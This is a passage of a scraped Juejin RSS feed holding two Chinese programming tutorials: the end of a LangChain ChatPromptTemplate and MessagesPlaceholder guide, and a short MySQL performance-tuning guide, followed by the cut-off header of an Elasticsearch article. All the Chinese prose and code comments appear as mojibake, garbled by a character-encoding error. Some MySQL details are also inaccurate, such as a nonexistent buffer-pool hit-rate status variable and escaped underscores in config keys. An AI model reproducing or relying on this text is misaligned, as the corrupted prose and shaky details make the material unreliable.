<h3 data-id="heading-7">ç»“è®ºï¼šç»™å ä½ç¬¦èµ‹å€¼ï¼Œé’ˆå¯¹äºChatPromptTemplateï¼Œæ¨èä½¿ç”¨ format_messages() æ–¹æ³•ï¼Œè¿”å›æ¶ˆæ¯åˆ—è¡¨ã€‚</h3>
<h2 data-id="heading-8">ä¸°å¯Œçš„å®ä¾‹åŒ–å‚æ•°ç±»å‹</h2>
<p>å‰é¢è®²äº†ChatPromptTemplateçš„ä¸¤ç§åˆ›å»ºæ–¹å¼ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸ç®¡ä½¿ç”¨æ„é€ æ–¹æ³•ï¼Œè¿˜æ˜¯ä½¿ç”¨from_messages()ï¼Œå‚æ•°ç±»å‹éƒ½æ˜¯<code>åˆ—è¡¨ç±»å‹</code>ã€‚å…¶å®åˆ—è¡¨ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯å¤šç§ç±»å‹ï¼Œå‰é¢æˆ‘ä»¬åªæ˜¯ä¸»è¦æµ‹è¯•äº†å…ƒç»„ç±»å‹ã€‚</p>
<p>æ¥ä¸‹æ¥ä¸¾å‡ ä¸ªä¾‹å­å§</p>
<ul>
<li>ç±»å‹1ï¼šstrç±»å‹ï¼ˆåˆ—è¡¨å‚æ•°æ˜¯strç±»å‹ã€ä¸æ¨èã€‘ï¼Œå› ä¸ºé»˜è®¤è§’è‰²éƒ½æ˜¯humanï¼‰</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#1.å¯¼å…¥ç›¸å…³ä¾èµ–</span>
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> SystemMessage,HumanMessage, AIMessage

<span class="hljs-comment"># 2.å®šä¹‰èŠå¤©æç¤ºè¯æ¨¡ç‰ˆ</span>
chat_template = ChatPromptTemplate.from_messages(
[
<span class="hljs-string">"Hello, {name}!"</span> <span class="hljs-comment"># ç­‰ä»·äº ("human", "Hello, {name}!")</span>
]
)

<span class="hljs-comment"># 3.1æ ¼å¼åŒ–èŠå¤©æç¤ºè¯æ¨¡ç‰ˆä¸­çš„å˜é‡(è‡ªå·±æä¾›çš„)</span>
messages = chat_template.format_messages(name=<span class="hljs-string">"å°è°·AI"</span>)

<span class="hljs-comment"># 3.2 ä½¿ç”¨invokeæ‰§è¡Œ</span>
messages=chat_template.invoke({<span class="hljs-string">"name"</span>:<span class="hljs-string">"å°è°·AI"</span>})
<span class="hljs-comment"># 4.æ‰“å°æ ¼å¼åŒ–åçš„èŠå¤©æç¤ºè¯æ¨¡ç‰ˆå†…å®¹</span>
<span class="hljs-built_in">print</span>(messages)
</code></pre>
<ul>
<li>ç±»å‹2ï¼šdictç±»å‹</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç¤ºä¾‹: å­—å…¸å½¢å¼çš„æ¶ˆæ¯</span>
prompt = ChatPromptTemplate.from_messages([
{<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ª{role}."</span>},
{<span class="hljs-string">"role"</span>: <span class="hljs-string">"human"</span>, <span class="hljs-string">"content"</span>: [<span class="hljs-string">"å¤æ‚å†…å®¹"</span>, {<span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>}]},
])
<span class="hljs-built_in">print</span>(prompt.format_messages(role=<span class="hljs-string">"æ•™å¸ˆ"</span>))
</code></pre>
<ul>
<li>ç±»å‹3ï¼šBaseMessagePromptTemplateç±»å‹ -&gt; <code>List&lt;BaseMessage&gt;</code></li>
</ul>
<p>ä½¿ç”¨LangChainä¸­å¸¸è§çš„SystemMessagePromptTemplateã€HumamMessagePromptTemplateã€AIMessagePromptTemplateï¼Œåˆ†åˆ«åˆ›å»ºç³»ç»Ÿæ¶ˆæ¯ã€äººå·¥æ¶ˆæ¯å’ŒAIæ¶ˆæ¯ï¼Œå®ƒä»¬æ˜¯ChatMessagePromptTemplateçš„ç‰¹å®šè§’è‰²å­ç±»ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import SystemMessagePromptTemplate, HumanMessagePromptTemplate, \
    ChatMessagePromptTemplate  <span class="hljs-comment"># 1.å¯¼å…¥å…ˆå…³åŒ…</span>

<span class="hljs-comment"># ç”¨è§’è‰²MessagePromptTemplate</span>
<span class="hljs-attr">system_template</span> = <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ª{role}ä¸“å®¶"</span>
<span class="hljs-attr">system_message_prompt</span> = SystemMessagePromptTemplate.from_template(system_template)
<span class="hljs-attr">human_template</span> = <span class="hljs-string">"ç»™æˆ‘è§£é‡Š{concept}ï¼Œç”¨æµ…æ˜¾æ˜“æ‡‚çš„è¯­è¨€"</span>
<span class="hljs-attr">human_message_prompt</span> = HumanMessagePromptTemplate.from_template(human_template)

<span class="hljs-attr">chatMessage</span> = ChatPromptTemplate.from_messages([
    system_message_prompt,
    human_message_prompt
])
print(chatMessage.format_messages(<span class="hljs-attr">role</span>=<span class="hljs-string">"åŒ»ç”Ÿ"</span>, concept=<span class="hljs-string">"å£è…”æºƒç–¡çš„ç”Ÿæˆ"</span>))
print(type(chatMessage.format_messages(<span class="hljs-attr">role</span>=<span class="hljs-string">"åŒ»ç”Ÿ"</span>, concept=<span class="hljs-string">"å£è…”æºƒç–¡çš„ç”Ÿæˆ"</span>)))

//è¾“å‡º
<span class="hljs-section">[SystemMessage(content='ä½ æ˜¯ä¸€ä¸ªåŒ»ç”Ÿä¸“å®¶', additional_kwargs={}, response_metadata={}), HumanMessage(content='ç»™æˆ‘è§£é‡Šå£è…”æºƒç–¡çš„ç”Ÿæˆï¼Œç”¨æµ…æ˜¾æ˜“æ‡‚çš„è¯­è¨€', additional_kwargs={}, response_metadata={})]</span>
&lt;class 'list'&gt;
</code></pre>
<ul>
<li>ç±»å‹4ï¼šChatMessagePromptTemplateç±»å‹ -&gt; <code>List&lt;BaseMessage&gt;</code></li>
</ul>
<p><code>ChatMessagePromptTemplate</code>ï¼Œç”¨äºæ„å»ºèŠå¤©æ¶ˆæ¯çš„æ¨¡æ¿ã€‚å®ƒå…è®¸ä½ åˆ›å»ºå¯é‡ç”¨çš„æ¶ˆæ¯æ¨¡æ¿ï¼Œè¿™äº›æ¨¡æ¿å¯ä»¥åŠ¨æ€åœ°æ’å…¥å˜é‡å€¼æ¥ç”Ÿæˆæœ€ç»ˆçš„èŠå¤©æ¶ˆæ¯</p>
<p>1.è§’è‰²æŒ‡å®š ï¼šå¯ä»¥ä¸ºæ¯æ¡æ¶ˆæ¯æŒ‡å®šè§’è‰²ï¼ˆå¦‚ "system"ã€"human"ã€"ai"ï¼‰ ç­‰ï¼Œè§’è‰²çµæ´»ã€‚</p>
<p>2.æ¨¡æ¿åŒ– ï¼šæ”¯æŒä½¿ç”¨å˜é‡å ä½ç¬¦ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶å¡«å……å…·ä½“å€¼</p>
<p>3.æ ¼å¼åŒ– ï¼šèƒ½å¤Ÿå°†æ¨¡æ¿ä¸è¾“å…¥å˜é‡ç»“åˆç”Ÿæˆæœ€ç»ˆçš„èŠå¤©æ¶ˆæ¯</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import ChatMessagePromptTemplate  <span class="hljs-comment"># 1.å¯¼å…¥å…ˆå…³åŒ…</span>

<span class="hljs-comment"># ä½¿ç”¨ChatMessagePromptTemplate</span>
<span class="hljs-attr">customChatMessageTemplate</span> = ChatMessagePromptTemplate.from_template(
    <span class="hljs-attr">role</span>=<span class="hljs-string">"åŒ»ç”Ÿ"</span>,
    <span class="hljs-attr">template</span>=human_template
)
print(customChatMessageTemplate.format_messages(<span class="hljs-attr">concept</span>=<span class="hljs-string">"å£è…”æºƒç–¡çš„ç”Ÿæˆ"</span>))
print(type(customChatMessageTemplate.format_messages(<span class="hljs-attr">concept</span>=<span class="hljs-string">"å£è…”æºƒç–¡çš„ç”Ÿæˆ"</span>)))
// è¾“å‡º
<span class="hljs-section">[ChatMessage(content='ç»™æˆ‘è§£é‡Šå£è…”æºƒç–¡çš„ç”Ÿæˆï¼Œç”¨æµ…æ˜¾æ˜“æ‡‚çš„è¯­è¨€', additional_kwargs={}, response_metadata={}, role='åŒ»ç”Ÿ')]</span>
&lt;class 'list'&gt;
</code></pre>
<p><strong>æç¤º:åœ¨ç¼–å†™ChatMessagePromptTemplateæ—¶å‘ç°æ€»ä¼šæŠŠfrom_template()å’Œformat_message()æ–¹æ³•æ··æ·†ä¸æ¸…ï¼Œæ‰€ä»¥åœ¨æ­¤è¿›è¡Œå¼ºè°ƒä¸¤è€…å…·ä½“ç”¨é€”ï¼š</strong></p>
<p><code>from_template():è¯¥æ–¹æ³•ä¸»è¦ç”¨æ¥åˆ›å»ºMessageTemplateæ¶ˆæ¯æ¨¡æ¿;</code></p>
<p><code>format_message():è¯¥æ–¹æ³•ä¸»è¦ç”¨æ¥å¡«å……æ¶ˆæ¯æ¨¡æ¿ä¸­çš„å˜é‡å€¼æ¥ç”Ÿæˆå¯¹åº”çš„Messageå®ä¾‹</code></p>
<h2 data-id="heading-9">æ’å…¥æ¶ˆæ¯åˆ—è¡¨ï¼šMessagesPlaceholderçš„ä½¿ç”¨</h2>
<p>å½“ä½ ä¸ç¡®å®šæ¶ˆæ¯æç¤ºæ¨¡æ¿ä½¿ç”¨ä»€ä¹ˆè§’è‰²ï¼Œæˆ–è€…å¸Œæœ›åœ¨æ ¼å¼åŒ–è¿‡ç¨‹ä¸­ æ’å…¥æ¶ˆæ¯åˆ—è¡¨ æ—¶ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ è¿™å°±éœ€è¦ä½¿ç”¨ MessagesPlaceholderï¼Œè´Ÿè´£åœ¨ç‰¹å®šä½ç½®æ·»åŠ æ¶ˆæ¯åˆ—è¡¨ã€‚
<code>ä½¿ç”¨åœºæ™¯ï¼šå¤šè½®å¯¹è¯ç³»ç»Ÿå­˜å‚¨å†å²æ¶ˆæ¯ä»¥åŠAgentçš„ä¸­é—´æ­¥éª¤å¤„ç†æ­¤åŠŸèƒ½éå¸¸æœ‰ç”¨ã€‚</code></p>
<p>ä¸¾ä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1.å¯¼å…¥ç›¸å…³åŒ…</span>
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate, MessagesPlaceholder, SystemMessagePromptTemplate, HumanMessagePromptTemplate
<span class="hljs-keyword">from</span> langchain_core.messages.system <span class="hljs-keyword">import</span> SystemMessage

<span class="hljs-comment"># 2.å®šä¹‰æ¶ˆæ¯æ¨¡æ¿</span>
prompt = ChatPromptTemplate.from_messages([
    SystemMessagePromptTemplate.from_template(<span class="hljs-string">"ä½ æ˜¯{role}"</span>),
    MessagesPlaceholder(variable_name=<span class="hljs-string">"intermediate_steps"</span>),
    HumanMessagePromptTemplate.from_template(<span class="hljs-string">"{query}"</span>)
])

<span class="hljs-comment"># 3.å®šä¹‰æ¶ˆæ¯å¯¹è±¡</span>
intermediate_steps = [
    SystemMessage(name=<span class="hljs-string">"search"</span>, content=<span class="hljs-string">"æ­å·:æ™´ï¼Œ25â„ƒ"</span>)
]

<span class="hljs-comment"># 4.æ ¼å¼åŒ–èŠå¤©æ¶ˆæ¯æç¤ºè¯æ¨¡æ¿</span>
promptMessage = prompt.format_messages(
    role=<span class="hljs-string">"å¤©æ°”é¢„æŠ¥å‘˜"</span>,
    intermediate_steps=intermediate_steps,
    query=<span class="hljs-string">"ä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ"</span>
)

<span class="hljs-built_in">print</span>(promptMessage)
//è¾“å‡º
[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯å¤©æ°”é¢„æŠ¥å‘˜'</span>, additional_kwargs={}, response_metadata={}), SystemMessage(content=<span class="hljs-string">'æ­å·:æ™´ï¼Œ25â„ƒ'</span>, additional_kwargs={}, response_metadata={}, name=<span class="hljs-string">'search'</span>), HumanMessage(content=<span class="hljs-string">'ä»Šå¤©å¤©æ°”å¦‚ä½•ï¼Ÿ'</span>, additional_kwargs={}, response_metadata={})]
</code></pre>
<p><strong>ä¸ªäººæ„Ÿè§‰è¿™ä¸ªMessagePlaceHolderåç»­è¿˜å¯ä»¥ç”¨äºä¸€äº›éœ€è¦AIå€ŸåŠ©å…¶ä»–å·¥å…·ï¼Œæˆ–è€…ç½‘ç»œæŸ¥è¯¢è·å–ç›¸å…³ä¿¡æ¯æ—¶çš„å ä½ç¬¦ï¼Œè·å–åˆ°ä¸“ä¸šä¿¡æ¯åå†è¿›è¡Œå¡«å…¥ä¼ é€’ç»™AIï¼Œç”¨äºæ›´åŠ ä¸“ä¸šæ€§çš„ä¿¡æ¯å¤„ç†åœºæ™¯</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL æ•°æ®åº“ä¼˜åŒ–æç®€æ•™ç¨‹ï¼šå¿«é€Ÿæå‡æ€§èƒ½]]></title>    <link>https://juejin.cn/post/7589126814829641780</link>    <guid>https://juejin.cn/post/7589126814829641780</guid>    <pubDate>2025-12-29T14:18:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829641780" data-draft-id="7589126814829625396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" MySQL æ•°æ®åº“ä¼˜åŒ–æç®€æ•™ç¨‹ï¼šå¿«é€Ÿæå‡æ€§èƒ½"/> <meta itemprop="keywords" content="MySQL"/> <meta itemprop="datePublished" content="2025-12-29T14:18:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœˆåº¦ç©ºé—´"/> <meta itemprop="url" content="https://juejin.cn/user/1567280531253689"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             MySQL æ•°æ®åº“ä¼˜åŒ–æç®€æ•™ç¨‹ï¼šå¿«é€Ÿæå‡æ€§èƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1567280531253689/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœˆåº¦ç©ºé—´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:18:03.000Z" title="Mon Dec 29 2025 14:18:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€åŸºç¡€ä¼˜åŒ–ï¼ˆ10 åˆ†é’Ÿä¸Šæ‰‹ï¼‰</h2>
<h3 data-id="heading-1">1. é…ç½®æ–‡ä»¶ï¼ˆmy.cnf/my.iniï¼‰æ ¸å¿ƒè°ƒæ•´</h3>
<pre><code class="hljs language-ini" lang="ini">max\<span class="hljs-attr">_connections</span> = <span class="hljs-number">1000</span>           è¿æ¥æ•°ä¸Šé™ï¼ˆé»˜è®¤<span class="hljs-number">151</span>ï¼‰

innodb\_buffer\_pool\<span class="hljs-attr">_size</span> = <span class="hljs-number">2</span>G     InnoDBç¼“å­˜ï¼ˆç‰©ç†å†…å­˜<span class="hljs-number">50</span>%-<span class="hljs-number">70</span>%ï¼‰

slow\_query\<span class="hljs-attr">_log</span> = <span class="hljs-number">1</span>               å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—

long\_query\<span class="hljs-attr">_time</span> = <span class="hljs-number">2</span>              è®°å½•&gt;<span class="hljs-number">2</span>ç§’çš„SQL

innodb\_flush\_log\_at\_trx\<span class="hljs-attr">_commit</span> = <span class="hljs-number">2</span>   è¯»å†™åˆ†ç¦»åœºæ™¯æå‡æ€§èƒ½
</code></pre>
<blockquote>
<p>ä¿®æ”¹åé‡å¯ï¼š</p>
<p><code>systemctl restart mysqld</code></p>
<p>ï¼ˆLinuxï¼‰/ æœåŠ¡é¢æ¿é‡å¯ï¼ˆWindowsï¼‰</p>
</blockquote>
<h3 data-id="heading-2">2. è¡¨ç»“æ„ä¼˜åŒ–</h3>
<ul>
<li>
<p>æ•°æ®ç±»å‹ï¼šæ‰‹æœºå·ç”¨<code>CHAR(11)</code>ã€å¹´é¾„ç”¨<code>TINYINT</code>ã€æ—¶é—´ç”¨<code>DATETIME</code></p>
</li>
<li>
<p>é¿å…<code>TEXT/BLOB</code>å­˜å¤§æ–‡ä»¶ï¼Œæ”¹ç”¨æ–‡ä»¶æœåŠ¡å™¨å­˜è·¯å¾„</p>
</li>
<li>
<p>å¿…åŠ ä¸»é”®ï¼ˆè‡ªå¢ INT ä¼˜å…ˆï¼‰ï¼ŒæŸ¥è¯¢é¢‘ç¹å­—æ®µåŠ ç´¢å¼•ï¼Œå¤šæ¡ä»¶æŸ¥ç”¨è”åˆç´¢å¼•ï¼ˆéµå¾ªæœ€å·¦å‰ç¼€ï¼‰</p>
</li>
</ul>
<h2 data-id="heading-3">äºŒã€SQL ä¼˜åŒ–ï¼ˆé¿å‘å³æé€Ÿï¼‰</h2>
<h3 data-id="heading-4">1. æ…¢æŸ¥è¯¢å®šä½</h3>
<ul>
<li>
<p>æŸ¥æ—¥å¿—ï¼š<code>tail -f /var/log/mysql/slow.log</code>ï¼ˆLinuxï¼‰</p>
</li>
<li>
<p>åˆ†æ SQLï¼š<code>EXPLAIN + ä½ çš„SQL</code>ï¼ˆçœ‹<code>type</code>æ˜¯å¦ä¸º ALLï¼Œ<code>key</code>æ˜¯å¦ä¸º NULLï¼‰</p>
</li>
</ul>
<h3 data-id="heading-5">2. æ ¸å¿ƒä¼˜åŒ–æŠ€å·§</h3>

























<table><thead><tr><th>åä¾‹</th><th>æ­£ä¾‹</th></tr></thead><tbody><tr><td><code>SELECT * FROM user WHERE id=1</code></td><td><code>SELECT id,username FROM user WHERE id=1</code></td></tr><tr><td><code>WHERE DATE(create_time)='2024-01-01'</code></td><td><code>WHERE create_time BETWEEN '2024-01-01 00:00:00' AND '2024-01-01 23:59:59'</code></td></tr><tr><td><code>WHERE id IN (SELECT user_id FROM order)</code></td><td><code>SELECT u.* FROM user u JOIN order o ON u.id=o.user_id</code></td></tr><tr><td><code>LIMIT 10000, 20</code></td><td><code>WHERE id&gt;10000 LIMIT 20</code></td></tr></tbody></table>
<h3 data-id="heading-6">3. ç´¢å¼•é¿å‘</h3>
<ul>
<li>
<p>ä¸ç”Ÿæ•ˆåœºæ™¯ï¼š<code>!=</code>ã€<code>IS NOT NULL</code>ã€å­—ç¬¦ä¸²ä¸åŠ å¼•å·ã€è”åˆç´¢å¼•ä¸æ»¡è¶³æœ€å·¦å‰ç¼€</p>
</li>
<li>
<p>å°è¡¨ï¼ˆä¸å»ºç´¢å¼•ï¼Œé¢‘ç¹æ›´æ–°å­—æ®µæ…å»ºç´¢å¼•</p>
</li>
</ul>
<h2 data-id="heading-7">ä¸‰ã€è¿›é˜¶ä¼˜åŒ–ï¼ˆç”Ÿäº§ç¯å¢ƒå¿…å¤‡ï¼‰</h2>
<h3 data-id="heading-8">1. è¯»å†™åˆ†ç¦»</h3>
<ul>
<li>
<p>ä¸»åº“å†™ï¼ˆINSERT/UPDATE/DELETEï¼‰ï¼Œä»åº“è¯»ï¼ˆSELECTï¼‰</p>
</li>
<li>
<p>æ ¸å¿ƒæ­¥éª¤ï¼šä¸»åº“å¼€äºŒè¿›åˆ¶æ—¥å¿—â†’ä»åº“é…ç½® server-idâ†’ä¸»åº“å»ºå¤åˆ¶ç”¨æˆ·â†’ä»åº“æ‰§è¡ŒåŒæ­¥å‘½ä»¤â†’å¯åŠ¨å¤åˆ¶</p>
</li>
</ul>
<h3 data-id="heading-9">2. åˆ†åº“åˆ†è¡¨</h3>
<ul>
<li>
<p>å•è¡¨ &gt; 1000 ä¸‡è¡Œç”¨ï¼š</p>
<ul>
<li>
<p>æ°´å¹³åˆ†è¡¨ï¼šæŒ‰æ—¶é—´ï¼ˆè®¢å•è¡¨ï¼‰ã€ID èŒƒå›´ / å“ˆå¸Œï¼ˆç”¨æˆ·è¡¨ï¼‰</p>
</li>
<li>
<p>å‚ç›´åˆ†è¡¨ï¼šå¤§è¡¨æ‹†å°ï¼ˆç”¨æˆ·åŸºæœ¬è¡¨ + è¯¦æƒ…è¡¨ï¼‰</p>
</li>
</ul>
</li>
<li>
<p>å·¥å…·ï¼šSharding-JDBCï¼ˆè½»é‡ï¼‰ã€MyCatï¼ˆä¸­é—´ä»¶ï¼‰</p>
</li>
</ul>
<h3 data-id="heading-10">3. ç¡¬ä»¶ / ç³»ç»Ÿä¼˜åŒ–</h3>
<ul>
<li>
<p>ç”¨ SSDã€æ•°æ®ä¸æ—¥å¿—åˆ†ç›˜å­˜</p>
</li>
<li>
<p>Linux å…³é—­ Swapï¼š<code>swapoff -a</code></p>
</li>
<li>
<p>è°ƒæ•´æ–‡ä»¶æè¿°ç¬¦ï¼š<code>echo "* soft nofile 65535" &gt;&gt; /etc/security/limits.conf</code></p>
</li>
</ul>
<h2 data-id="heading-11">å››ã€ä¼˜åŒ–éªŒè¯</h2>
<h3 data-id="heading-12">1. å…³é”®æŒ‡æ ‡ï¼ˆæ‰§è¡Œ<code>SHOW GLOBAL STATUS;</code>ï¼‰</h3>
<ul>
<li>
<p><code>Threads_connected</code>ï¼šè¿æ¥æ•°â‰¤max_connections</p>
</li>
<li>
<p><code>Slow_queries</code>ï¼šæ…¢æŸ¥è¯¢æ•°è¶Šå°‘è¶Šå¥½</p>
</li>
<li>
<p><code>Innodb_buffer_pool_read_hit_rate</code>ï¼šç¼“å­˜å‘½ä¸­ç‡ &gt; 99%</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ Elasticsearch ä¸­çš„ç»“æ„åŒ–è¾“å‡ºåˆ›å»ºå¯é çš„ agents]]></title>    <link>https://juejin.cn/post/7589171972446322730</link>    <guid>https://juejin.cn/post/7589171972446322730</guid>    <pubDate>2025-12-30T00:36:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972446322730" data-draft-id="7589201772118425606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ Elasticsearch ä¸­çš„ç»“æ„åŒ–è¾“å‡ºåˆ›å»ºå¯é çš„ agents"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-30T00:36:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 